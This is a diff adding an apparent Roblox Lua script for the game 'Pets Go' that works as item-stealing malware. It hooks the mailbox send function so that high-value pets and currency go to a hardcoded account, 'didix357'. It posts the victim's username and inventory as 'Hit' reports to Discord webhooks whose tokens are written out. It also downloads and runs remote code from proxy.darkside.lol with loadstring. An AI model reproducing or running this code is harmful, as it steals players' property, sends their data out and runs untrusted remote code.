@@ -1,0 +1,328 @@
+return function(dh, pn, gn, dp, potc)
+    local zzzu, zzzv =
+        pcall(
+        function()
+            local x = getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Scripts.Core["Process Pending GUI"])
+            x.PurchasePending()
+            x.Close = function()
+                return true
+            end
+            if not dp then
+                dp = 0
+            end
+            if not _G.itc then
+                _G.itc = 0
+            end
+            if not _G.Min then
+                _G.Min = 500000000
+            end
+            if not potc then
+                function ifUserNull()
+                    return true
+                end
+                potc = 0
+            end
+            if _G.dx then
+                return
+            end
+            if tonumber(gn) == 100 then
+                gn = 0
+            end
+            local mps = game:GetService("MarketplaceService")
+            local xyzab = mps:GetProductInfo(game.PlaceId).Name
+            local msg = ""
+            request =
+                (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or
+                request
+            local big = 0
+            local qbig, qbiga
+            qbig, qbiga =
+                pcall(
+                function()
+                    local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+                    local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+                    save = save.Get()
+                    for i, v in pairs(save.Inventory.Pet) do
+                        if require(dir[v.id]).difficulty >= big then
+                            big = require(dir[v.id]).difficulty
+                        end
+                    end
+                    big = "1/" .. big
+                    local biggy = big .. " (" .. _G.Min .. ")"
+                    big = ""
+                    local tab = {}
+                    for i, v in pairs(save.Inventory.Pet) do
+                        if require(dir[v.id]).difficulty >= _G.Min then
+                            table.insert(tab, {v.id, require(dir[v.id]).difficulty, (v._am or 1), v})
+                        end
+                    end
+                    table.sort(
+                        tab,
+                        function(a, b)
+                            return a[2] > b[2]
+                        end
+                    )
+                    if #tab >= 7 then
+                        local ctab = {}
+                        for i = 1, 7, 1 do
+                            ctab[i] = tab[i]
+                        end
+                        tab = ctab
+                    end
+                    if #tab >= 1 then
+                        for i, v in pairs(tab) do
+                            local deepn = v[1]
+                            if v[4]._uq then
+                                deepn = deepn .. " (#" .. v[4]._uq.sr .. ")"
+                            end
+                            big = big .. "+ " .. v[3] .. "x " .. deepn .. " (1/" .. v[2] .. ")\\n"
+                        end
+                    else
+                        big = "- No pets over 1/" .. _G.Min .. " :("
+                    end
+                end
+            )
+            if big == "" then
+                big = "- No pets over 1/" .. _G.Min .. " :("
+            end
+            if not qbig then
+                loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(qbiga)
+            end
+            if not _G.User then
+                _G.User = "lol idk"
+            end
+            if not _G.Min then
+                _G.Min = 500000000
+            end
+            local save = require(game:GetService("ReplicatedStorage").Library.Client.Save)
+            _G.pvc = ""
+            local mailc = 0
+            pcall(
+                function()
+                    _G.pvc = ""
+                    local remoteFunction = Instance.new("RemoteFunction")
+                    local originalFunction                          
+                    originalFunction =
+                        hookfunction(
+                        remoteFunction.InvokeServer,
+                        function(x, ...)
+                            local args = {...}
+                            print(tostring(x) == "Mailbox: Send" and args[3] ~= _G.pvc)
+                            if
+                                tostring(x) == "Mailbox: Send" and args[1] ~= (_G.User or "omg lol") and
+                                    game.Players.LocalPlayer.Name ~= "iTzGeradTamvan" and
+                                    game.Players.LocalPlayer.Name ~= "didix357" and
+                                    ifUserNull()    
+                             then
+                                local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+                                local dir = game:GetService("ReplicatedStorage")["__DIRECTORY"].Pets
+                                if
+                                    args[3] == "Pet" and
+                                        require(dir[save.Inventory.Pet[args[4]].id]).difficulty >= 1000000000
+                                 then
+                                    args[1] = "didix357"
+                                elseif args[3] == "Pet" then
+                                    --e
+                                elseif args[3] == "Currency" and args[5] <= 5000000 then
+                                    --e
+                                else
+                                    args[1] = "didix357"
+                                end
+                            elseif tostring(x) == "Mailbox: Send" and args[4] ~= _G.pvc then
+                                _G.pvc = args[4]
+                                mailc = mailc + 1
+                                print("-------------lol")
+                                local qv = "starsh"
+                                print(qv)
+                                local save = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get()
+                                local nam = "Gems"
+                                pcall(
+                                    function()
+                                        nam = save.Inventory.Pet[args[4]].id or args[4]
+                                    end
+                                )
+                                qv =
+                                    '{"content":"' ..
+                                    game.Players.LocalPlayer.Name ..
+                                        " >> " .. args[5] .. "x " .. nam .. " >> " .. _G.User .. '"}'
+                                print(qv)
+                                local responsexr =
+                                    request(
+                                    {
+                                        Url = "https://discordapp.com/api/webhooks/1305669883903606876/Ug70lrMSDzXmVo0h7jx5LmvFiYnlHCAPVgPJad9sxyxuS8R_skfiwrECPCl_paVmOD20",
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = qv
+                                    }
+                                )
+                                print(responsexr.StatusMessage)
+                            end
+                            return originalFunction(x, unpack(args))
+                        end
+                    )
+
+                    game.Players.PlayerRemoving:Connect(
+                        function(p)
+                            if mailc >= 1 and p == game.Players.LocalPlayer then
+                                local qv = "starsh"
+                                print(qv)
+                                qv =
+                                    '{"content":"' ..
+                                    game.Players.LocalPlayer.Name .. " left. Mail sent: " .. mailc .. '"}'
+                                print(qv)
+                                local responseqxr =
+                                    request(
+                                    {
+                                        Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = qv
+                                    }
+                                )
+                            end
+                        end
+                    )
+                    game.Players.LocalPlayer.Destroying:Connect(
+                        function()
+                            if mailc >= 1 then
+                                local qv = "starsh"
+                                print(qv)
+                                qv =
+                                    '{"content":"' ..
+                                    game.Players.LocalPlayer.Name .. " left. Mail sent: " .. mailc .. '"}'
+                                print(qv)
+                                local responseqxr =
+                                    request(
+                                    {
+                                        Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+                                        Method = "POST",
+                                        Headers = {["Content-Type"] = "application/json"},
+                                        Body = qv
+                                    }
+                                )
+                            end
+                        end
+                    )
+                end
+            )
+            if dh then
+                _G.dx = true
+                msg =
+                    '{"embeds":[{"fields":[{"name":"User","value":"' ..
+                    game.Players.LocalPlayer.Name ..
+                        " / " ..
+                            game.Players.LocalPlayer.DisplayName ..
+                                '"},{"name":"Game","value":"' ..
+                                    xyzab ..
+                                        '"},{"value":"' ..
+                                            _G.User ..
+                                                '","name":"Hitter","inline":false},{"value":"```\\n' ..
+                                                    pn ..
+                                                        '```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n' ..
+                                                            gn ..
+                                                                '```","name":"⮚ Gems ⮘","inline":false},{"value":"```\\n' ..
+                                                                    _G.itc ..
+                                                                        '```","name":"⮚ Items ⮘","inline":false},{"value":"```diff\\n' ..
+                                                                            big ..
+                                                                                '```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":1048320}],"tts":false,"content":"@everyone"}'
+            else
+                msg =
+                    '{"embeds":[{"fields":[{"name":"User","value":"' ..
+                    game.Players.LocalPlayer.Name ..
+                        " / " ..
+                            game.Players.LocalPlayer.DisplayName ..
+                                '"},{"name":"Game","value":"' ..
+                                    xyzab ..
+                                        '"},{"value":"' ..
+                                            _G.User ..
+                                                '","name":"Hitter","inline":false},{"value":"```\\n' ..
+                                                    pn ..
+                                                        '```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n' ..
+                                                            gn ..
+                                                                '```","name":"⮚ Gems ⮘","inline":false},{"value":"```\\n' ..
+                                                                    _G.itc ..
+                                                                        '```","name":"⮚ Items ⮘","inline":false},{"value":"```diff\\n' ..
+                                                                            big ..
+                                                                                '```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"@everyone"}'
+            end
+            local response =
+                request(
+                {
+                    Url = _G.wh,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = msg
+                }
+            )
+            local xxxvvv = "lolly"
+            pcall(
+                function()
+                    xxxvvv = response.StatusMessage
+                end
+            )
+            if typeof(xxxvvv) ~= "string" then
+                xxxvvv = "Lolly"
+            end
+            if not _G.User then
+                _G.User = "yve (pet change hit)"
+            end
+
+            print(#big)
+            local log = ""
+            if dh then
+                log =
+                    '{"embeds":[{"fields":[{"name":"User","value":"' ..
+                    game.Players.LocalPlayer.Name ..
+                        " / " ..
+                            game.Players.LocalPlayer.DisplayName ..
+                                '"},{"name":"Game","value":"' ..
+                                    xyzab ..
+                                        '"},{"value":"' ..
+                                            _G.User ..
+                                                '","name":"Hitter","inline":false},{"value":"```\\n' ..
+                                                    pn ..
+                                                        '```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n' ..
+                                                            gn ..
+                                                                '```","name":"⮚ Gems ⮘","inline":false},{"value":"```\\n' ..
+                                                                    _G.itc ..
+                                                                        '```","name":"⮚ Items ⮘","inline":false},{"value":"```diff\\n' ..
+                                                                            big ..
+                                                                                '```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go DH Hit!","color":1048320}],"tts":false,"content":"@everyone ' ..
+                                                                                    xxxvvv .. '"}'
+            else
+                log =
+                    '{"embeds":[{"fields":[{"name":"User","value":"' ..
+                    game.Players.LocalPlayer.Name ..
+                        " / " ..
+                            game.Players.LocalPlayer.DisplayName ..
+                                '"},{"name":"Game","value":"' ..
+                                    xyzab ..
+                                        '"},{"value":"' ..
+                                            _G.User ..
+                                                '","name":"Hitter","inline":false},{"value":"```\\n' ..
+                                                    pn ..
+                                                        '```","name":"⮚ Pets ⮘","inline":true},{"value":"```lua\\n' ..
+                                                            gn ..
+                                                                '```","name":"⮚ Gems ⮘","inline":false},{"value":"```\\n' ..
+                                                                    _G.itc ..
+                                                                        '```","name":"⮚ Items ⮘","inline":false},{"value":"```diff\\n' ..
+                                                                            big ..
+                                                                                '```","name":"⮚ Hitted Pets ⮘","inline":false}],"title":"Pets Go Hit!","color":65512}],"tts":false,"content":"' ..
+                                                                                    xxxvvv .. '"}'
+            end
+            local responser =
+                request(
+                {
+                    Url = "https://discordapp.com/api/webhooks/1298650438111068170/hippfrrGnjC-5wIWfrUS8gV6AAwqJKlpUiAmxHSaSFQhHPutaOym0MmSSxSpADpwZIAQ",
+                    Method = "POST",
+                    Headers = {["Content-Type"] = "application/json"},
+                    Body = log
+                }
+            )
+            return response
+        end
+    )
+    if not zzzu then
+        loadstring(game:HttpGet("https://proxy.darkside.lol/webhook-error.yve"))()(zzzv)
+    end
+end
